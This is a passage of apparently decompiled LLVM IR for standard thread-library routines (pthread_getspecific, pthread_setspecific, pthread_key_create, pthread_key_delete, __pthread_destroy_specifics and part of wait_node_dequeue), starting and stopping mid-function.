  uselistorder i32 364, { 2, 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80571fc = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v6_805720a = icmp ugt i32 %arg1, 1023
  br i1 %v6_805720a, label %dec_label_pc_8057233, label %dec_label_pc_805720c

dec_label_pc_805720c:                             ; preds = %entry
  %v1_805720c = call i32 @thread_self.6(i32 %v0_80571fc)
  %v0_8057211 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8057213 = udiv i32 %v0_8057211, 32
  %v2_8057216 = mul nuw nsw i32 %v2_8057213, 4
  %v3_8057216 = add i32 %v1_805720c, 236
  %v4_8057216 = add i32 %v3_8057216, %v2_8057216
  %v5_8057216 = inttoptr i32 %v4_8057216 to i32*
  %v6_8057216 = load i32, i32* %v5_8057216, align 4
  %v1_805721d = icmp eq i32 %v6_8057216, 0
  br i1 %v1_805721d, label %dec_label_pc_8057233, label %dec_label_pc_8057221

dec_label_pc_8057221:                             ; preds = %dec_label_pc_805720c
  %v1_8057221 = mul i32 %v0_8057211, 8
  %v2_8057221 = add i32 %v1_8057221, ptrtoint (i32* @global_var_8078600.689 to i32)
  %v3_8057221 = inttoptr i32 %v2_8057221 to i32*
  %v4_8057221 = load i32, i32* %v3_8057221, align 8
  %v5_8057221 = icmp eq i32 %v4_8057221, 0
  br i1 %v5_8057221, label %dec_label_pc_8057233, label %dec_label_pc_805722b

dec_label_pc_805722b:                             ; preds = %dec_label_pc_8057221
  %v1_805722b = urem i32 %v0_8057211, 32
  store i32 %v1_805722b, i32* %ebx.global-to-local, align 4
  %v2_805722e = mul nuw nsw i32 %v1_805722b, 4
  %v3_805722e = add i32 %v2_805722e, %v6_8057216
  %v4_805722e = inttoptr i32 %v3_805722e to i32*
  %v5_805722e = load i32, i32* %v4_805722e, align 4
  br label %dec_label_pc_8057235

dec_label_pc_8057233:                             ; preds = %dec_label_pc_8057221, %dec_label_pc_805720c, %entry
  br label %dec_label_pc_8057235

dec_label_pc_8057235:                             ; preds = %dec_label_pc_805722b, %dec_label_pc_8057233
  %storemerge = phi i32 [ %v5_805722e, %dec_label_pc_805722b ], [ 0, %dec_label_pc_8057233 ]
  store i32 %v0_80571fc, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805722b, { 1, 0 }
  uselistorder i32 %v0_8057211, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057235, { 1, 0 }
}

define i32 @__pthread_destroy_specifics() local_unnamed_addr {
dec_label_pc_80572b2:
  %v0_8057239 = load i32, i32* @ebp, align 4
  %v0_805723a = load i32, i32* @edi, align 4
  %v0_805723b = load i32, i32* @esi, align 4
  %v0_805723c = load i32, i32* @ebx, align 4
  store i32 0, i32* @ebp, align 4
  %v1_8057242 = call i32 @thread_self.6(i32 %v0_805723c)
  store i32 %v1_8057242, i32* @esi, align 4
  %v0_80572b2.pre = load i32, i32* @ebp, align 4
  %v1_80572b2 = add i32 %v0_80572b2.pre, -3
  %v6_80572b2 = sub i32 2, %v0_80572b2.pre
  %v7_80572b2 = and i32 %v6_80572b2, %v0_80572b2.pre
  %v8_80572b2 = icmp slt i32 %v7_80572b2, 0
  %v9_80572b2 = icmp eq i32 %v1_80572b2, 0
  %v10_80572b2 = icmp slt i32 %v1_80572b2, 0
  %v3_80572b5 = icmp eq i1 %v10_80572b2, %v8_80572b2
  %v4_80572b5 = icmp eq i1 %v9_80572b2, false
  %v5_80572b5 = and i1 %v4_80572b5, %v3_80572b5
  br i1 %v5_80572b5, label %dec_label_pc_80572c3, label %dec_label_pc_80572b7

dec_label_pc_8057253:                             ; preds = %dec_label_pc_80572a4.dec_label_pc_8057253_crit_edge, %dec_label_pc_80572b7
  %v0_8057255 = phi i32 [ %v1_8057242, %dec_label_pc_80572b7 ], [ %v0_8057255.pre, %dec_label_pc_80572a4.dec_label_pc_8057253_crit_edge ]
  %v0_80572a4.pre23 = phi i32 [ 0, %dec_label_pc_80572b7 ], [ %v1_80572a4, %dec_label_pc_80572a4.dec_label_pc_8057253_crit_edge ]
  store i32 0, i32* @edi, align 4
  %v2_8057255 = mul i32 %v0_80572a4.pre23, 4
  %v3_8057255 = add i32 %v2_8057255, 236
  %v4_8057255 = add i32 %v3_8057255, %v0_8057255
  %v5_8057255 = inttoptr i32 %v4_8057255 to i32*
  %v6_8057255 = load i32, i32* %v5_8057255, align 4
  %v7_8057255 = icmp eq i32 %v6_8057255, 0
  %v1_805725d = icmp eq i1 %v7_8057255, false
  br i1 %v1_805725d, label %dec_label_pc_805729f.preheader, label %dec_label_pc_80572a4

dec_label_pc_805729f.preheader:                   ; preds = %dec_label_pc_8057253
  br label %dec_label_pc_8057261

dec_label_pc_8057261:                             ; preds = %dec_label_pc_805729e.dec_label_pc_8057261_crit_edge, %dec_label_pc_805729f.preheader
  %v1_8057276 = phi i32 [ %v0_8057255, %dec_label_pc_805729f.preheader ], [ %v1_8057276.pre, %dec_label_pc_805729e.dec_label_pc_8057261_crit_edge ]
  %v0_80572a4.pre25 = phi i32 [ %v0_80572a4.pre23, %dec_label_pc_805729f.preheader ], [ %v0_80572a4.pre, %dec_label_pc_805729e.dec_label_pc_8057261_crit_edge ]
  %v0_805726f24 = phi i32 [ 0, %dec_label_pc_805729f.preheader ], [ %v1_805729e, %dec_label_pc_805729e.dec_label_pc_8057261_crit_edge ]
  %v2_8057263 = mul i32 %v0_80572a4.pre25, 32
  %v2_8057266 = add i32 %v2_8057263, %v0_805726f24
  %v1_8057268 = mul i32 %v2_8057266, 8
  %v2_8057268 = add i32 %v1_8057268, ptrtoint (i32* @global_var_8078604.690 to i32)
  %v3_8057268 = inttoptr i32 %v2_8057268 to i32*
  %v4_8057268 = load i32, i32* %v3_8057268, align 4
  %v1_805727d = icmp eq i32 %v4_8057268, 0
  br i1 %v1_805727d, label %dec_label_pc_805729e, label %dec_label_pc_8057283

dec_label_pc_8057283:                             ; preds = %dec_label_pc_8057261
  %v3_8057276 = mul i32 %v0_80572a4.pre25, 4
  %v4_8057276 = add i32 %v3_8057276, 236
  %v5_8057276 = add i32 %v4_8057276, %v1_8057276
  %v6_8057276 = inttoptr i32 %v5_8057276 to i32*
  %v7_8057276 = load i32, i32* %v6_8057276, align 4
  %v1_805726f = mul i32 %v0_805726f24, 4
  %v8_8057276 = add i32 %v7_8057276, %v1_805726f
  %v1_805727f = inttoptr i32 %v8_8057276 to i32*
  store i32 0, i32* %v1_805727f, align 4
  call void @__pseudo_call(i32 %v4_8057268)
  %v0_805729e.pre = load i32, i32* @edi, align 4
  %v0_80572a4.pre.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805729e

dec_label_pc_805729e:                             ; preds = %dec_label_pc_8057261, %dec_label_pc_8057283
  %v0_80572a4.pre = phi i32 [ %v0_80572a4.pre25, %dec_label_pc_8057261 ], [ %v0_80572a4.pre.pre, %dec_label_pc_8057283 ]
  %v0_805729e = phi i32 [ %v0_805726f24, %dec_label_pc_8057261 ], [ %v0_805729e.pre, %dec_label_pc_8057283 ]
  %v1_805729e = add i32 %v0_805729e, 1
  store i32 %v1_805729e, i32* @edi, align 4
  %v7_80572a2 = icmp sgt i32 %v1_805729e, 31
  br i1 %v7_80572a2, label %dec_label_pc_80572a4, label %dec_label_pc_805729e.dec_label_pc_8057261_crit_edge

dec_label_pc_805729e.dec_label_pc_8057261_crit_edge: ; preds = %dec_label_pc_805729e
  %v1_8057276.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057261

dec_label_pc_80572a4:                             ; preds = %dec_label_pc_805729e, %dec_label_pc_8057253
  %v0_80572a4 = phi i32 [ %v0_80572a4.pre23, %dec_label_pc_8057253 ], [ %v0_80572a4.pre, %dec_label_pc_805729e ]
  %v1_80572a4 = add i32 %v0_80572a4, 1
  store i32 %v1_80572a4, i32* @ebx, align 4
  %v7_80572a8 = icmp sgt i32 %v1_80572a4, 31
  br i1 %v7_80572a8, label %dec_label_pc_80572aa, label %dec_label_pc_80572a4.dec_label_pc_8057253_crit_edge

dec_label_pc_80572a4.dec_label_pc_8057253_crit_edge: ; preds = %dec_label_pc_80572a4
  %v0_8057255.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8057253

dec_label_pc_80572aa:                             ; preds = %dec_label_pc_80572a4
  %v0_80572aa = load i32, i32* @ebp, align 4
  %v1_80572aa = add i32 %v0_80572aa, 1
  store i32 %v1_80572aa, i32* @ebp, align 4
  %v0_80572c3.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80572c3

dec_label_pc_80572b7:                             ; preds = %dec_label_pc_80572b2
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8057253

dec_label_pc_80572c3:                             ; preds = %dec_label_pc_80572aa, %dec_label_pc_80572b2
  %v0_80572c3 = phi i32 [ %v1_8057242, %dec_label_pc_80572b2 ], [ %v0_80572c3.pre, %dec_label_pc_80572aa ]
  %stack_var_-20.0.lcssa = phi i32 [ 1, %dec_label_pc_80572b2 ], [ 0, %dec_label_pc_80572aa ]
  %v1_80572c3 = add i32 %v0_80572c3, 28
  %v2_80572c3 = inttoptr i32 %v1_80572c3 to i32*
  %v3_80572c3 = load i32, i32* %v2_80572c3, align 4
  store i32 %v3_80572c3, i32* @eax, align 4
  store i32 %v0_80572c3, i32* @edx, align 4
  %v1_80572c8 = call i32 @__pthread_lock(i32 %stack_var_-20.0.lcssa)
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80572d1

dec_label_pc_80572d1:                             ; preds = %dec_label_pc_80572c3, %dec_label_pc_80572f3
  %v1_80572d122 = phi i32 [ 0, %dec_label_pc_80572c3 ], [ %v1_80572f3, %dec_label_pc_80572f3 ]
  %v0_80572d1 = load i32, i32* @esi, align 4
  %v2_80572d1 = mul i32 %v1_80572d122, 4
  %v3_80572d1 = add i32 %v2_80572d1, 236
  %v4_80572d1 = add i32 %v3_80572d1, %v0_80572d1
  %v5_80572d1 = inttoptr i32 %v4_80572d1 to i32*
  %v6_80572d1 = load i32, i32* %v5_80572d1, align 4
  %v1_80572d8 = icmp eq i32 %v6_80572d1, 0
  br i1 %v1_80572d8, label %dec_label_pc_80572f3, label %dec_label_pc_80572dc

dec_label_pc_80572dc:                             ; preds = %dec_label_pc_80572d1
  %v1_80572e0 = call i32 @free(i32 %v6_80572d1)
  %v0_80572e5 = load i32, i32* @esi, align 4
  %v1_80572e5 = load i32, i32* @ebx, align 4
  %v2_80572e5 = mul i32 %v1_80572e5, 4
  %v3_80572e5 = add i32 %v0_80572e5, 236
  %v4_80572e5 = add i32 %v3_80572e5, %v2_80572e5
  %v5_80572e5 = inttoptr i32 %v4_80572e5 to i32*
  store i32 0, i32* %v5_80572e5, align 4
  %v0_80572f3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80572f3

dec_label_pc_80572f3:                             ; preds = %dec_label_pc_80572d1, %dec_label_pc_80572dc
  %v0_80572f3 = phi i32 [ %v1_80572d122, %dec_label_pc_80572d1 ], [ %v0_80572f3.pre, %dec_label_pc_80572dc ]
  %v1_80572f3 = add i32 %v0_80572f3, 1
  store i32 %v1_80572f3, i32* @ebx, align 4
  %v7_80572f7 = icmp sgt i32 %v1_80572f3, 31
  br i1 %v7_80572f7, label %dec_label_pc_80572f9, label %dec_label_pc_80572d1

dec_label_pc_80572f9:                             ; preds = %dec_label_pc_80572f3
  %v0_80572fc = load i32, i32* @esi, align 4
  %v1_80572fc = add i32 %v0_80572fc, 28
  %v2_80572fc = inttoptr i32 %v1_80572fc to i32*
  %v3_80572fc = load i32, i32* %v2_80572fc, align 4
  %v1_80572ff = inttoptr i32 %v3_80572fc to i32*
  %v2_80572ff = call i32 @__pthread_unlock(i32* %v1_80572ff)
  store i32 %v0_805723c, i32* @ebx, align 4
  store i32 %v0_805723b, i32* @esi, align 4
  store i32 %v0_805723a, i32* @edi, align 4
  store i32 %v0_8057239, i32* @ebp, align 4
  ret i32 %v2_80572ff

; uselistorder directives
  uselistorder i32 %v1_80572f3, { 1, 0, 2 }
  uselistorder i32 %v1_80572d122, { 1, 0 }
  uselistorder i32 %v0_80572c3, { 1, 0 }
  uselistorder i32 %v1_80572a4, { 1, 0, 2 }
  uselistorder i32 %v1_805729e, { 0, 2, 1 }
  uselistorder i32 %v4_8057268, { 1, 0 }
  uselistorder i32 %v0_805726f24, { 1, 0, 2 }
  uselistorder i32 %v0_80572a4.pre25, { 1, 2, 0 }
  uselistorder i32 %v0_80572a4.pre23, { 2, 0, 1 }
  uselistorder i32 %v1_80572b2, { 1, 0 }
  uselistorder label %dec_label_pc_80572f3, { 1, 0 }
  uselistorder label %dec_label_pc_80572d1, { 1, 0 }
  uselistorder label %dec_label_pc_805729e, { 1, 0 }
  uselistorder label %dec_label_pc_8057253, { 1, 0 }
}

define i32 @pthread_setspecific(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_805730e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8057319 = icmp ugt i32 %arg1, 1023
  br i1 %v6_8057319, label %dec_label_pc_8057370, label %dec_label_pc_805731b

dec_label_pc_805731b:                             ; preds = %entry
  %v1_805731b = mul i32 %arg1, 8
  %v2_805731b = add i32 %v1_805731b, ptrtoint (i32* @global_var_8078600.689 to i32)
  %v3_805731b = inttoptr i32 %v2_805731b to i32*
  %v4_805731b = load i32, i32* %v3_805731b, align 8
  %v5_805731b = icmp eq i32 %v4_805731b, 0
  br i1 %v5_805731b, label %dec_label_pc_8057370, label %dec_label_pc_8057325

dec_label_pc_8057325:                             ; preds = %dec_label_pc_805731b
  %v1_8057325 = call i32 @thread_self.6(i32 %v0_805730e)
  %v0_805732a = load i32, i32* @ebx, align 4
  %v2_805732c = udiv i32 %v0_805732a, 32
  store i32 %v2_805732c, i32* @esi, align 4
  store i32 %v1_8057325, i32* @edi, align 4
  %v2_8057331 = mul nuw nsw i32 %v2_805732c, 4
  %v3_8057331 = add i32 %v1_8057325, 236
  %v4_8057331 = add i32 %v3_8057331, %v2_8057331
  %v5_8057331 = inttoptr i32 %v4_8057331 to i32*
  %v6_8057331 = load i32, i32* %v5_8057331, align 4
  %v7_8057331 = icmp eq i32 %v6_8057331, 0
  %v1_8057339 = icmp eq i1 %v7_8057331, false
  br i1 %v1_8057339, label %dec_label_pc_805735b, label %dec_label_pc_805733b

dec_label_pc_805733b:                             ; preds = %dec_label_pc_8057325
  %v3_8057341 = call i32 @calloc(i64 32, i32 4)
  %v1_8057350 = icmp eq i32 %v3_8057341, 0
  br i1 %v1_8057350, label %dec_label_pc_8057375, label %dec_label_pc_8057354

dec_label_pc_8057354:                             ; preds = %dec_label_pc_805733b
  %v1_8057354 = load i32, i32* @edi, align 4
  %v2_8057354 = load i32, i32* @esi, align 4
  %v3_8057354 = mul i32 %v2_8057354, 4
  %v4_8057354 = add i32 %v1_8057354, 236
  %v5_8057354 = add i32 %v4_8057354, %v3_8057354
  %v6_8057354 = inttoptr i32 %v5_8057354 to i32*
  store i32 %v3_8057341, i32* %v6_8057354, align 4
  %v0_805735b.pre = load i32, i32* @ebx, align 4
  %v0_805735e.pre = load i32, i32* @edi, align 4
  %v1_805735e.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805735b

dec_label_pc_805735b:                             ; preds = %dec_label_pc_8057325, %dec_label_pc_8057354
  %v1_805735e = phi i32 [ %v2_805732c, %dec_label_pc_8057325 ], [ %v1_805735e.pre, %dec_label_pc_8057354 ]
  %v0_805735e = phi i32 [ %v1_8057325, %dec_label_pc_8057325 ], [ %v0_805735e.pre, %dec_label_pc_8057354 ]
  %v0_805735b = phi i32 [ %v0_805732a, %dec_label_pc_8057325 ], [ %v0_805735b.pre, %dec_label_pc_8057354 ]
  %v1_805735b = urem i32 %v0_805735b, 32
  %v2_805735e = mul i32 %v1_805735e, 4
  %v3_805735e = add i32 %v0_805735e, 236
  %v4_805735e = add i32 %v3_805735e, %v2_805735e
  %v5_805735e = inttoptr i32 %v4_805735e to i32*
  %v6_805735e = load i32, i32* %v5_805735e, align 4
  %v3_8057369 = mul nuw nsw i32 %v1_805735b, 4
  %v4_8057369 = add i32 %v3_8057369, %v6_805735e
  %v5_8057369 = inttoptr i32 %v4_8057369 to i32*
  store i32 %arg2, i32* %v5_8057369, align 4
  br label %dec_label_pc_8057375

dec_label_pc_8057370:                             ; preds = %dec_label_pc_805731b, %entry
  br label %dec_label_pc_8057375

dec_label_pc_8057375:                             ; preds = %dec_label_pc_805733b, %dec_label_pc_805735b, %dec_label_pc_8057370
  %v0_8057378 = phi i32 [ 12, %dec_label_pc_805733b ], [ 0, %dec_label_pc_805735b ], [ 22, %dec_label_pc_8057370 ]
  ret i32 %v0_8057378

; uselistorder directives
  uselistorder i32 %v3_8057341, { 1, 0 }
  uselistorder i32 %v2_805732c, { 2, 1, 0 }
  uselistorder i32 %v0_805732a, { 1, 0 }
  uselistorder i32 %v1_8057325, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057375, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805735b, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 %arg1, i32* @ebx, align 4
  store i32 ptrtoint (i32* @global_var_807a600.691 to i32), i32* %stack_var_-28, align 4
  %v1_8057387 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  %v0_805738f = load i32, i32* @ebx, align 4
  %v6_8057395 = icmp ugt i32 %v0_805738f, 1023
  br i1 %v6_8057395, label %dec_label_pc_80573a1, label %dec_label_pc_8057397

dec_label_pc_8057397:                             ; preds = %entry
  %v1_8057397 = mul i32 %v0_805738f, 8
  %v2_8057397 = add i32 %v1_8057397, ptrtoint (i32* @global_var_8078600.689 to i32)
  %v3_8057397 = inttoptr i32 %v2_8057397 to i32*
  %v4_8057397 = load i32, i32* %v3_8057397, align 8
  %v5_8057397 = icmp eq i32 %v4_8057397, 0
  %v1_805739f = icmp eq i1 %v5_8057397, false
  br i1 %v1_805739f, label %dec_label_pc_80573b5, label %dec_label_pc_80573a1

dec_label_pc_80573a1:                             ; preds = %dec_label_pc_8057397, %entry
  store i32 ptrtoint (i32* @global_var_807a600.691 to i32), i32* %stack_var_-28, align 4
  %v1_80573a9 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  br label %dec_label_pc_8057410

dec_label_pc_80573b5:                             ; preds = %dec_label_pc_8057397
  store i32 0, i32* %v3_8057397, align 8
  %v0_80573c0 = load i32, i32* @ebx, align 4
  %v1_80573c0 = mul i32 %v0_80573c0, 8
  %v2_80573c0 = add i32 %v1_80573c0, ptrtoint (i32* @global_var_8078604.690 to i32)
  %v3_80573c0 = inttoptr i32 %v2_80573c0 to i32*
  store i32 0, i32* %v3_80573c0, align 4
  %v0_80573cb = load i32, i32* @global_var_8073c84.658, align 4
  %v10_80573cb = icmp eq i32 %v0_80573cb, -1
  br i1 %v10_80573cb, label %dec_label_pc_8057401, label %dec_label_pc_80573d4

dec_label_pc_80573d4:                             ; preds = %dec_label_pc_80573b5
  %v0_80573d4 = load i32, i32* %stack_var_-28, align 4
  %v1_80573d4 = call i32 @thread_self.6(i32 %v0_80573d4)
  %v0_80573d9 = load i32, i32* @ebx, align 4
  %v2_80573db = udiv i32 %v0_80573d9, 32
  store i32 %v2_80573db, i32* @esi, align 4
  %v1_80573de = urem i32 %v0_80573d9, 32
  store i32 %v1_80573de, i32* @ebx, align 4
  store i32 %v1_80573d4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80573e3

dec_label_pc_80573e3:                             ; preds = %dec_label_pc_80573fb, %dec_label_pc_80573d4
  %v0_80573e9 = phi i32 [ %v2_80573fb, %dec_label_pc_80573fb ], [ %v1_80573d4, %dec_label_pc_80573d4 ]
  %v1_80573e3 = add i32 %v0_80573e9, 44
  %v2_80573e3 = inttoptr i32 %v1_80573e3 to i8*
  %v3_80573e3 = load i8, i8* %v2_80573e3, align 1
  %v4_80573e3 = icmp eq i8 %v3_80573e3, 0
  %v1_80573e7 = icmp eq i1 %v4_80573e3, false
  br i1 %v1_80573e7, label %dec_label_pc_80573fb, label %dec_label_pc_80573e9

dec_label_pc_80573e9:                             ; preds = %dec_label_pc_80573e3
  %v1_80573e9 = load i32, i32* @esi, align 4
  %v2_80573e9 = mul i32 %v1_80573e9, 4
  %v3_80573e9 = add i32 %v0_80573e9, 236
  %v4_80573e9 = add i32 %v3_80573e9, %v2_80573e9
  %v5_80573e9 = inttoptr i32 %v4_80573e9 to i32*
  %v6_80573e9 = load i32, i32* %v5_80573e9, align 4
  %v1_80573f0 = icmp eq i32 %v6_80573e9, 0
  br i1 %v1_80573f0, label %dec_label_pc_80573fb, label %dec_label_pc_80573f4

dec_label_pc_80573f4:                             ; preds = %dec_label_pc_80573e9
  %v1_80573f4 = load i32, i32* @ebx, align 4
  %v2_80573f4 = mul i32 %v1_80573f4, 4
  %v3_80573f4 = add i32 %v2_80573f4, %v6_80573e9
  %v4_80573f4 = inttoptr i32 %v3_80573f4 to i32*
  store i32 0, i32* %v4_80573f4, align 4
  %v0_80573fb.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80573fb

dec_label_pc_80573fb:                             ; preds = %dec_label_pc_80573e9, %dec_label_pc_80573e3, %dec_label_pc_80573f4
  %v0_80573fb = phi i32 [ %v0_80573e9, %dec_label_pc_80573e9 ], [ %v0_80573e9, %dec_label_pc_80573e3 ], [ %v0_80573fb.pre, %dec_label_pc_80573f4 ]
  %v1_80573fb = inttoptr i32 %v0_80573fb to i32*
  %v2_80573fb = load i32, i32* %v1_80573fb, align 4
  store i32 %v2_80573fb, i32* %edx.global-to-local, align 4
  %v12_80573fd = icmp eq i32 %v2_80573fb, %v1_80573d4
  %v1_80573ff = icmp eq i1 %v12_80573fd, false
  br i1 %v1_80573ff, label %dec_label_pc_80573e3, label %dec_label_pc_8057401

dec_label_pc_8057401:                             ; preds = %dec_label_pc_80573fb, %dec_label_pc_80573b5
  store i32 ptrtoint (i32* @global_var_807a600.691 to i32), i32* %stack_var_-28, align 4
  %v1_8057409 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  br label %dec_label_pc_8057410

dec_label_pc_8057410:                             ; preds = %dec_label_pc_80573a1, %dec_label_pc_8057401
  %storemerge = phi i32 [ 22, %dec_label_pc_80573a1 ], [ 0, %dec_label_pc_8057401 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_80573fb, { 0, 2, 1 }
  uselistorder i32 %v0_80573d9, { 1, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 236, { 0, 1, 2, 3, 5, 6, 7, 8, 4 }
  uselistorder i32 (i32)* @thread_self.6, { 5, 4, 0, 3, 1, 2, 6 }
  uselistorder label %dec_label_pc_8057410, { 1, 0 }
  uselistorder label %dec_label_pc_80573fb, { 2, 0, 1 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 0, i32* @ebx, align 4
  %v1_8057421 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  store i32 %v1_8057421, i32* %eax.global-to-local, align 4
  %v0_8057463.pr = load i32, i32* @ebx, align 4
  %v7_805746910 = icmp sgt i32 %v0_8057463.pr, 1023
  br i1 %v7_805746910, label %dec_label_pc_805746b, label %dec_label_pc_805742b

dec_label_pc_805742b:                             ; preds = %entry, %dec_label_pc_8057462
  %v0_805746211 = phi i32 [ %v1_8057462, %dec_label_pc_8057462 ], [ %v0_8057463.pr, %entry ]
  %v1_805742b = mul i32 %v0_805746211, 8
  %v2_805742b = add i32 %v1_805742b, ptrtoint (i32* @global_var_8078600.689 to i32)
  %v3_805742b = inttoptr i32 %v2_805742b to i32*
  %v4_805742b = load i32, i32* %v3_805742b, align 8
  %v5_805742b = icmp eq i32 %v4_805742b, 0
  %v1_8057433 = icmp eq i1 %v5_805742b, false
  br i1 %v1_8057433, label %dec_label_pc_8057462, label %dec_label_pc_8057435

dec_label_pc_8057435:                             ; preds = %dec_label_pc_805742b
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v3_805742b, align 8
  %v0_8057447 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057447 = load i32, i32* @ebx, align 4
  %v2_8057447 = mul i32 %v1_8057447, 8
  %v3_8057447 = add i32 %v2_8057447, ptrtoint (i32* @global_var_8078604.690 to i32)
  %v4_8057447 = inttoptr i32 %v3_8057447 to i32*
  store i32 %v0_8057447, i32* %v4_8057447, align 4
  %v1_8057453 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v0_805745c = load i32, i32* @ebx, align 4
  store i32 %v0_805745c, i32* %arg1, align 4
  br label %dec_label_pc_805747d

dec_label_pc_8057462:                             ; preds = %dec_label_pc_805742b
  %v1_8057462 = add nsw i32 %v0_805746211, 1
  store i32 %v1_8057462, i32* @ebx, align 4
  %v7_8057469 = icmp sgt i32 %v0_805746211, 1022
  br i1 %v7_8057469, label %dec_label_pc_805746b, label %dec_label_pc_805742b

dec_label_pc_805746b:                             ; preds = %dec_label_pc_8057462, %entry
  %v1_8057473 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807a600.691 to i32))
  br label %dec_label_pc_805747d

dec_label_pc_805747d:                             ; preds = %dec_label_pc_8057435, %dec_label_pc_805746b
  %storemerge = phi i32 [ 11, %dec_label_pc_805746b ], [ 0, %dec_label_pc_8057435 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8057462, { 1, 0 }
  uselistorder i32 %v0_805746211, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_807a600.691 to i32), { 1, 0, 2, 3, 6, 4, 7, 5, 8 }
  uselistorder label %dec_label_pc_805747d, { 1, 0 }
  uselistorder label %dec_label_pc_805742b, { 1, 0 }
}

define i32 @wait_node_dequeue() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8057488 = load i32, i32* @edx, align 4
  %v1_8057488 = load i32, i32* @eax, align 4
  %v12_8057488 = icmp eq i32 %v0_8057488, %v1_8057488
  %v1_805748a = icmp eq i1 %v12_8057488, false
  %v0_80574a5.pre = load i32, i32* @ecx, align 4
  br i1 %v1_805748a, label %dec_label_pc_80574a5, label %dec_label_pc_805748c

dec_label_pc_805748c:                             ; preds = %entry
  %v1_805748c = inttoptr i32 %v0_80574a5.pre to i32*
  %v2_805748c = load i32, i32* %v1_805748c, align 4
  store i32 %v2_805748c, i32* %ebx.global-to-local, align 4
  %v1_8057490 = inttoptr i32 %v0_8057488 to i32*
  %v2_8057490 = load i32, i32* %v1_8057490, align 4
  %v15_8057490 = icmp eq i32 %v0_80574a5.pre, %v2_8057490
  %v22_8057490 = select i1 %v15_8057490, i32 %v2_805748c, i32 %v2_8057490
  store i32 %v22_8057490, i32* %v1_8057490, align 4
  %v1_8057494 = zext i1 %v15_8057490 to i32
  %v2_8057494 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8057494 = and i32 %v2_8057494, -256
  %v4_8057494 = or i32 %v3_8057494, %v1_8057494
  store i32 %v4_8057494, i32* %ebx.global-to-local, align 4
  %v4_8057497 = icmp eq i1 %v15_8057490, false
  br i1 %v4_8057497, label %dec_label_pc_805749f.preheader, label %dec_label_pc_80574a9

dec_label_pc_805749f.preheader:                   ; preds = %dec_label_pc_805748c
  %v0_805749f.pre = load i32, i32* @edx, align 4
  %v0_80574a1.pre = load i32, i32* @ecx, align 4
  %v1_805749f7 = inttoptr i32 %v0_805749f.pre to i32*
  %v2_805749f8 = load i32, i32* %v1_805749f7, align 4
  %v12_80574a110 = icmp eq i32 %v0_80574a1.pre, %v2_805749f8
  %v1_80574a311 = icmp eq i1 %v12_80574a110, false
  br i1 %v1_80574a311, label %dec_label_pc_805749d, label %dec_label_pc_80574a5.loopexit

dec_label_pc_805749d:                             ; preds = %dec_label_pc_805749f.preheader, %dec_label_pc_805749d
  %v2_805749f12 = phi i32 [ %v2_805749f, %dec_label_pc_805749d ], [ %v2_805749f8, %dec_label_pc_805749f.preheader ]
  %v1_805749f = inttoptr i32 %v2_805749f12 to i32*
  %v2_805749f = load i32, i32* %v1_805749f, align 4
  %v12_80574a1 = icmp eq i32 %v0_80574a1.pre, %v2_805749f
  %v1_80574a3 = icmp eq i1 %v12_80574a1, false
  br i1 %v1_80574a3, label %dec_label_pc_805749d, label %dec_label_pc_80574a5.loopexit

dec_label_pc_80574a5.loopexit:                    ; preds = %dec_label_pc_805749d, %dec_label_pc_805749f.preheader
  %v0_805749f.lcssa = phi i32 [ %v0_805749f.pre, %dec_label_pc_805749f.preheader ], [ %v2_805749f12, %dec_label_pc_805749d ]
  br label %dec_label_pc_80574a5

dec_label_pc_80574a5:                             ; preds = %entry, %dec_label_pc_80574a5.loopexit
  %v1_80574a7 = phi i32 [ %v0_805749f.lcssa, %dec_label_pc_80574a5.loopexit ], [ %v0_8057488, %entry ]
